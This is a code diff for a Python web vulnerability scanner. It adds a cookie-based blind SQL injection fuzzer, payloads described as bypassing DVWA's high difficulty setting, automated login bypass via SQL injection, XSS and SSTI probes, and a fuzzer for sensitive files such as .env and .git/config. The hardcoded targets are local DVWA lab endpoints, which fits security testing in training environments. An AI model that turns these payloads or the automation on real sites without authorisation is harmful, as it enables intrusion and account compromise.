@@ -98,7 +98,6 @@ def run_heavy_spider(start_url, context, max_pages=15):
     visited = set([start_url])
     discovered_endpoints = set([start_url]) 
     
-    # BLACKLIST: Never click these or you will kill the session
     destructive_keywords = ['logout', 'signout', 'logoff', 'exit', 'destroy']
     
     page = context.new_page()
@@ -109,19 +108,15 @@ def run_heavy_spider(start_url, context, max_pages=15):
         
         try:
             page.goto(current_url, timeout=15000)
-            try:
-                page.wait_for_load_state("networkidle", timeout=5000)
+            try: page.wait_for_load_state("networkidle", timeout=5000)
             except: pass
             
-            # Extract links
             hrefs = page.evaluate("""() => {
                 return Array.from(document.querySelectorAll('a')).map(a => a.href);
             }""")
             
             for href in hrefs:
                 if not href: continue
-                
-                # --- SESSION PRESERVATION FIX ---
                 if any(keyword in href.lower() for keyword in destructive_keywords):
                     continue
                     
@@ -130,34 +125,27 @@ def run_heavy_spider(start_url, context, max_pages=15):
                 clean_href_domain = parsed_href.netloc.replace("www.", "")
 
                 if clean_target in clean_href_domain and href.startswith('http'):
-                    # SPA ROUTING FIX
-                    if '/#/' in href or '#/' in href:
-                        clean_url = href 
-                    else:
-                        clean_url = href.split('#')[0] 
+                    if '/#/' in href or '#/' in href: clean_url = href 
+                    else: clean_url = href.split('#')[0] 
                         
                     if clean_url not in visited:
                         visited.add(clean_url)
                         queue.append(clean_url)
                         discovered_endpoints.add(clean_url)
             
-            # Extract standard forms
             actions = page.evaluate("""() => {
                 return Array.from(document.querySelectorAll('form')).map(f => f.action);
             }""")
             
             for action in actions:
                 if action:
-                    # --- SESSION PRESERVATION FIX ---
                     if any(keyword in action.lower() for keyword in destructive_keywords):
                         continue
-                        
                     full_action_url = urljoin(current_url, action)
                     if urlparse(full_action_url).netloc == target_domain:
                         discovered_endpoints.add(full_action_url)
                         
         except Exception as e:
-            print(f"  [!] Crawler skipped {current_url}: Timeout or Navigation error.")
             continue
             
     page.close()
@@ -165,10 +153,10 @@ def run_heavy_spider(start_url, context, max_pages=15):
     return list(discovered_endpoints)
 
 # --- MODULE 2: Header & SSL Analysis ---
-def scan_headers_and_ssl(target_url):
+def scan_headers_and_ssl(target_url, cookies=None):
     findings = []
     try:
-        res = requests.get(target_url, headers=REQ_HEADERS, timeout=8)
+        res = requests.get(target_url, headers=REQ_HEADERS, cookies=cookies, timeout=8)
         headers = {k.lower(): v for k, v in res.headers.items()}
         
         if 'content-security-policy' not in headers:
@@ -179,58 +167,86 @@ def scan_headers_and_ssl(target_url):
             findings.append(create_vuln("CLICKJACKING", target_url, "X-Frame-Options header is missing.", "Low"))
         if 'server' in headers:
             findings.append(create_vuln("SERVER_ERROR", target_url, f"Server header exposes technology: {headers['server']}", "Low"))
-    except Exception as e:
-        pass # Silently pass to avoid terminal clutter on massive crawls
+    except: pass
     return findings
 
 # --- MODULE 3: Sensitive File Fuzzer ---
-def scan_sensitive_files(target_url):
+def scan_sensitive_files(target_url, cookies=None):
     findings = []
-    files = [
-        ".env", ".git/config", "backup.sql", "database.sql", 
-        "phpinfo.php", ".DS_Store", "web.config", "server.js"
-    ]
-    
-    # Only fuzz files on the root directory to save time and prevent redundant checks
+    files = [".env", ".git/config", "backup.sql", "database.sql", "phpinfo.php", ".DS_Store", "web.config", "server.js"]
     parsed_url = urlparse(target_url)
     base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
-    
-    if target_url != base_url:
-        return findings
+    if target_url != base_url: return findings
 
-    print(f"[*] 📂 Fuzzing sensitive files on {base_url}...")
     for filename in files:
         full_url = urljoin(base_url, filename)
         try:
-            res = requests.get(full_url, headers=REQ_HEADERS, timeout=4, allow_redirects=False)
-            if res.status_code == 200 and len(res.content) > 10:
-                if "404" not in res.text.lower() and "<html" not in res.text.lower():
-                    findings.append(create_vuln("SENSITIVE_FILE", full_url, f"Accessible sensitive file found: {filename}", "Critical"))
+            res = requests.get(full_url, headers=REQ_HEADERS, cookies=cookies, timeout=4, allow_redirects=False)
+            if res.status_code == 200 and len(res.content) > 10 and "404" not in res.text.lower() and "<html" not in res.text.lower():
+                findings.append(create_vuln("SENSITIVE_FILE", full_url, f"Accessible sensitive file found: {filename}", "Critical"))
         except: pass
     return findings
 
-# --- MODULE 4: Fast URL Parameter Fuzzer (NEW UPGRADED SQLi ENGINE) ---
-def scan_url_parameters(target_url):
+# --- NEW MODULE: Cookie Fuzzer (Defeats DVWA High Blind SQLi) ---
+def scan_cookies(target_url, cookies=None):
+    alerts = []
+    if not cookies: return alerts
+    
+    print(f"[*] 🍪 Fuzzing session cookies on {target_url}...")
+    
+    # Payload designed specifically to bypass 'High' difficulty strict bounds
+    payloads = [
+        {"type": "SQL_INJECTION", "payload": "1' AND SLEEP(5)#", "time_delay": 5},
+        {"type": "SQL_INJECTION", "payload": "1' OR SLEEP(5)='", "time_delay": 5}
+    ]
+    
+    baseline_time = 0
+    try:
+        start = time.time()
+        requests.get(target_url, headers=REQ_HEADERS, cookies=cookies, timeout=10)
+        baseline_time = time.time() - start
+    except: baseline_time = 1
+    
+    for cookie_name, cookie_value in cookies.items():
+        if cookie_name in ['PHPSESSID', 'session', 'security']: continue # Don't fuzz the actual session tokens
+        
+        for attack in payloads:
+            fuzzed_cookies = cookies.copy()
+            fuzzed_cookies[cookie_name] = attack["payload"]
+            
+            try:
+                start_time = time.time()
+                res = requests.get(target_url, headers=REQ_HEADERS, cookies=fuzzed_cookies, timeout=12)
+                elapsed = time.time() - start_time
+                
+                if elapsed > (baseline_time + 4.5):
+                    alerts.append(create_vuln("SQL_INJECTION", target_url, f"CONFIRMED BLIND SQLi via Cookie '{cookie_name}'. Sleep triggered for {elapsed:.2f}s.", "Critical"))
+            except requests.exceptions.Timeout:
+                alerts.append(create_vuln("SQL_INJECTION", target_url, f"CONFIRMED BLIND SQLi via Cookie '{cookie_name}'. Server timed out on sleep command.", "Critical"))
+                
+    return alerts
+
+# --- MODULE 4: Fast URL Parameter Fuzzer (UPGRADED FOR 'HIGH' DIFFICULTY) ---
+def scan_url_parameters(target_url, cookies=None):
     alerts = []
     parsed_url = urlparse(target_url)
     params = parse_qsl(parsed_url.query)
-    
     if not params: return alerts
         
-    print(f"[*] 🧬 Fuzzing URL parameters with multi-engine payloads on {target_url}...")
+    print(f"[*] 🧬 Fuzzing URL parameters on {target_url}...")
     
     payloads = [
         {"type": "SQL_INJECTION", "payload": "' OR '1'='1", "check": "500"}, 
+        {"type": "SQL_INJECTION", "payload": "' OR '1'='1' #", "check": "500"}, # Bypass for 'LIMIT' filters
         {"type": "SQL_INJECTION", "payload": "%27%20OR%20SLEEP%285%29--", "time_delay": 5}, 
-        {"type": "SQL_INJECTION", "payload": "'; WAITFOR DELAY '0:0:5'--", "time_delay": 5}, 
-        {"type": "SQL_INJECTION", "payload": "' || pg_sleep(5)--", "time_delay": 5}, 
+        {"type": "SQL_INJECTION", "payload": "1' AND SLEEP(5)#", "time_delay": 5}, # High Difficulty Hash comment
         {"type": "SSTI", "payload": "{{7*7}}", "check": "49"}
     ]
     
     baseline_time = 0
     try:
         start = time.time()
-        requests.get(target_url, headers=REQ_HEADERS, timeout=10)
+        requests.get(target_url, headers=REQ_HEADERS, cookies=cookies, timeout=10)
         baseline_time = time.time() - start
     except: baseline_time = 1
     
@@ -242,19 +258,16 @@ def scan_url_parameters(target_url):
             
             try:
                 start_time = time.time()
-                res = requests.get(fuzzed_url, headers=REQ_HEADERS, timeout=12) 
+                res = requests.get(fuzzed_url, headers=REQ_HEADERS, cookies=cookies, timeout=12) 
                 elapsed = time.time() - start_time
                 
-                # Check Time-Based SQLi
                 if "time_delay" in attack and elapsed > (baseline_time + 4.5):
                     alerts.append(create_vuln("SQL_INJECTION", fuzzed_url, f"CONFIRMED TIME-BASED SQLi: Engine sleep triggered for {elapsed:.2f}s.", "Critical"))
                     continue
                 
-                # Check 500 Errors
                 if res.status_code == 500 and attack["type"] == "SQL_INJECTION":
                     alerts.append(create_vuln("SQL_INJECTION", fuzzed_url, "SUSPECTED SQLi: Payload crashed the database query (HTTP 500).", "High"))
                 
-                # Check Reflected Execution
                 if "check" in attack and attack["check"] in res.text and attack["check"] != "500":
                     alerts.append(create_vuln(attack["type"], fuzzed_url, "Payload execution confirmed in response.", "Critical"))
             except requests.exceptions.Timeout:
@@ -275,9 +288,10 @@ def scan_active_playwright(target_url, context, oast_domain):
 
     payloads = [
         {"key": "SQL_INJECTION", "payload": "' OR '1'='1", "check": sql_errors},
-        {"key": "SQL_INJECTION", "payload": "admin@juice-sh.op' --", "check": sql_errors}, # Juice Shop SQLite Auth Bypass
-        {"key": "SQL_INJECTION", "payload": "' OR true--", "check": sql_errors}, # Universal SPA bypass
-        {"key": "XSS_REFLECTED", "payload": "\"><iframe src=\"javascript:alert('SENTINEL')\">", "check": []}, # Bypasses Angular DOMPurify
+        {"key": "SQL_INJECTION", "payload": "admin@juice-sh.op' --", "check": sql_errors}, 
+        {"key": "SQL_INJECTION", "payload": "' OR true--", "check": sql_errors}, 
+        {"key": "SQL_INJECTION", "payload": "' OR 1=1 #", "check": sql_errors}, # DVWA High Form Bypass
+        {"key": "XSS_REFLECTED", "payload": "\"><iframe src=\"javascript:alert('SENTINEL')\">", "check": []}, 
         {"key": "SSTI", "payload": "{{7*7}}", "check": ["49"]},
         {"key": "OPEN_REDIRECT", "payload": "http://google.com", "check": []}
     ]
@@ -293,24 +307,20 @@ def scan_active_playwright(target_url, context, oast_domain):
     page.on("dialog", handle_dialog)
     
     try:
-        # 1. INITIAL LOAD & POPUP CLEARING
         page.goto(target_url, timeout=30000)
-        page.wait_for_timeout(3500) # FORCE WAIT: Give Angular/React time to render components
+        page.wait_for_timeout(3500) 
 
-        # Clear annoying SPA popups (Welcome banners, Cookie notices)
         for selector in ["button[aria-label='Close Welcome Banner']", "a[aria-label='dismiss cookie message']", "button:has-text('Dismiss')", ".cc-dismiss", "button.close-dialog"]:
             try: page.locator(selector).click(timeout=1000)
             except: pass
 
-        # --- 2. DEDICATED AUTH BYPASS ENGINE ---
         if page.locator("input[type='password']").count() > 0:
             print(f"[*] 🕵️ Login form detected on {target_url}. Engaging Aggressive Auth Bypass...")
             for attack in [p for p in payloads if p["key"] == "SQL_INJECTION"]:
                 try:
                     page.goto(target_url, timeout=30000)
-                    page.wait_for_timeout(3500) # FORCE WAIT for form to rebuild
+                    page.wait_for_timeout(3500) 
                     pass_field = page.locator("input[type='password']").first
-                    
                     user_field = page.locator("input[name*='user'], input[name*='email'], input[type='email'], input[type='text'], input#email").first
                     submit_btn = page.locator("button[type='submit'], input[type='submit'], button#loginButton, button.mat-primary, button:has-text('Log in')").first
                     
@@ -319,35 +329,29 @@ def scan_active_playwright(target_url, context, oast_domain):
                         user_field.fill(attack["payload"])
                         pass_field.fill("Password123!") 
                         
-                        # AGGRESSIVE SPA BYPASS: Force 'Enter' to bypass Angular NgForm validation blocks
                         pass_field.press("Enter")
                         page.wait_for_timeout(500)
                         
-                        # Fallback force-click just in case Enter is trapped
                         if submit_btn.is_visible():
                             try: submit_btn.evaluate("node => node.removeAttribute('disabled')")
                             except: pass
                             try: submit_btn.click(force=True, timeout=2000)
                             except: pass
                             
-                        page.wait_for_timeout(3000) # Wait for backend auth response
+                        page.wait_for_timeout(3000) 
                         
-                        # SPA SUCCESS DETECTION: Check LocalStorage AND Cookies
                         current_url = page.url.lower()
                         has_auth_cookie = any(c['name'] in ['token', 'session', 'jwt'] for c in context.cookies())
-                        ls_token = page.evaluate("() => localStorage.getItem('token')") # Juice Shop specifically
+                        ls_token = page.evaluate("() => localStorage.getItem('token')") 
                         
                         if ls_token or has_auth_cookie or (current_url != target_url.lower() and "login" not in current_url and "error" not in current_url):
                             alerts.append(create_vuln("SQL_INJECTION", target_url, f"CRITICAL AUTH BYPASS: Payload {attack['payload']} successfully bypassed the login gate!", "Critical"))
                             break 
-                except Exception:
-                    continue
+                except Exception: continue
 
-        # --- 3. UNIVERSAL INPUT FUZZING (No Form Tags Required) ---
         page.goto(target_url, timeout=30000)
         page.wait_for_timeout(3500)
         
-        # Grab absolutely every text-like input on the screen, ignoring hidden/checkboxes
         input_selector = "input:not([type='hidden']):not([type='password']):not([type='submit']):not([type='checkbox']):not([type='radio']), textarea"
         inputs = page.locator(input_selector).all()
         
@@ -357,37 +361,30 @@ def scan_active_playwright(target_url, context, oast_domain):
                 for attack in payloads:
                     try:
                         page.goto(target_url, timeout=30000)
-                        page.wait_for_timeout(3500) # Re-wait for mount after reload
-                        
+                        page.wait_for_timeout(3500) 
                         current_input = page.locator(input_selector).nth(idx)
                         
                         if current_input.is_visible():
                             current_input.fill("")
                             current_input.fill(attack["payload"])
-                            current_input.press("Enter") # Forces the UI to process the input
-                            
-                            page.wait_for_timeout(2500) # Wait for UI reflection or alert()
+                            current_input.press("Enter") 
+                            page.wait_for_timeout(2500) 
                                 
                             if attack["key"] == "OPEN_REDIRECT" and "google.com" in urlparse(page.url).netloc:
                                 alerts.append(create_vuln("OPEN_REDIRECT", target_url, "Input successfully redirected user.", "Medium"))
                             elif attack["key"] in ["SQL_INJECTION", "SSTI"]:
                                 if any(x in page.content().lower() for x in attack["check"]):
                                     alerts.append(create_vuln(attack["key"], target_url, f"Payload {attack['payload']} caused a Database Syntax Error.", "Critical"))
-                    except Exception:
-                        continue
+                    except Exception: continue
 
-    except Exception as e:
-        print(f"[!] Browser Interaction Error on {target_url}: {e}")
-    finally:
-        page.close() 
+    except Exception as e: print(f"[!] Browser Interaction Error on {target_url}: {e}")
+    finally: page.close() 
         
     return alerts
-
 
 # --- ORCHESTRATOR ---
 def run_deep_scan(target_url, user_id=None, auth_config=None):
 
-    # --- AUTO-DETECT DVWA ---
     if ("localhost:8080" in target_url or "127.0.0.1:8080" in target_url) and not auth_config:
         print("[*] 🤖 Local DVWA Environment Detected! Auto-injecting admin credentials...")
         auth_config = {
@@ -405,7 +402,6 @@ def run_deep_scan(target_url, user_id=None, auth_config=None):
         "financial_risk_total": 0
     }
 
-    # Generate OAST Token once for the entire session
     oast_token = generate_oast_token()
     oast_domain = f"webhook.site/{oast_token}" if oast_token else "webhook.site/fallback-test-123"
 
@@ -436,28 +432,31 @@ def run_deep_scan(target_url, user_id=None, auth_config=None):
                 except Exception as e:
                     print(f"[!] Authentication Engine Failed: {e}")
 
-            # --- 2. RECONNAISSANCE PHASE (The Spider) ---
-            # endpoints_to_attack = run_heavy_spider(target_url, context, max_pages=15)
-            
+            # --- SYNCHRONIZE SESSIONS FOR API/REQUESTS ---
+            # Extract cookies from Playwright to keep the `requests` module logged in
+            req_cookies = {cookie['name']: cookie['value'] for cookie in context.cookies()}
+
+            # --- FAST DEV MODE / RECONNAISSANCE ---
             print("[*] ⚡ FAST DEV MODE ACTIVATED: Bypassing spider for instant testing...")
-            
-            # Directly feed the known vulnerable DVWA endpoints into the exploitation phase
             endpoints_to_attack = [
-                "http://localhost:8080/vulnerabilities/sqli/",   # Tests the Auth Bypass & SQLi engines
-                "http://localhost:8080/vulnerabilities/xss_r/"   # Tests the Playwright DOM XSS engine
+                "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit", 
+                "http://localhost:8080/vulnerabilities/xss_r/",
+                "http://localhost:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit" # Added Blind SQLi endpoint
             ]
+            
             # --- 3. EXPLOITATION PHASE ---
             for endpoint in endpoints_to_attack:
                 print(f"[*] ⚔️  Attacking endpoint: {endpoint}")
-                report["vulnerabilities"].extend(scan_headers_and_ssl(endpoint))
-                report["vulnerabilities"].extend(scan_sensitive_files(endpoint))
                 
-                # --- NEW INTEGRATION: Upgraded SQLi engine applied to discovered endpoints ---
-                report["vulnerabilities"].extend(scan_url_parameters(endpoint)) 
+                # Pass the synchronized cookies to ALL request-based modules
+                report["vulnerabilities"].extend(scan_headers_and_ssl(endpoint, cookies=req_cookies))
+                report["vulnerabilities"].extend(scan_sensitive_files(endpoint, cookies=req_cookies))
+                report["vulnerabilities"].extend(scan_url_parameters(endpoint, cookies=req_cookies)) 
+                report["vulnerabilities"].extend(scan_cookies(endpoint, cookies=req_cookies)) # NEW Cookie Fuzzer
                 
+                # Playwright manages its own session context
                 report["vulnerabilities"].extend(scan_active_playwright(endpoint, context, oast_domain))
 
-            # --- 4. ASYNCHRONOUS VALIDATION PHASE ---
             print("[*] ⏳ Waiting 5 seconds for asynchronous OAST callbacks...")
             time.sleep(5)
             if check_oast_interactions(oast_token):
@@ -468,7 +467,6 @@ def run_deep_scan(target_url, user_id=None, auth_config=None):
     except Exception as e:
         print(f"[!] Deep Scan Critical Engine Failure: {e}")
 
-    # Deduplicate findings across all mapped pages
     unique_vulns = []
     seen = set()
     for v in report["vulnerabilities"]:
@@ -480,7 +478,6 @@ def run_deep_scan(target_url, user_id=None, auth_config=None):
             
     report["vulnerabilities"] = unique_vulns
 
-    # Calculate summary metrics
     for v in report["vulnerabilities"]:
         report["financial_risk_total"] += v.get("est_cost", 0)
         sev = v.get("severity", "Low")
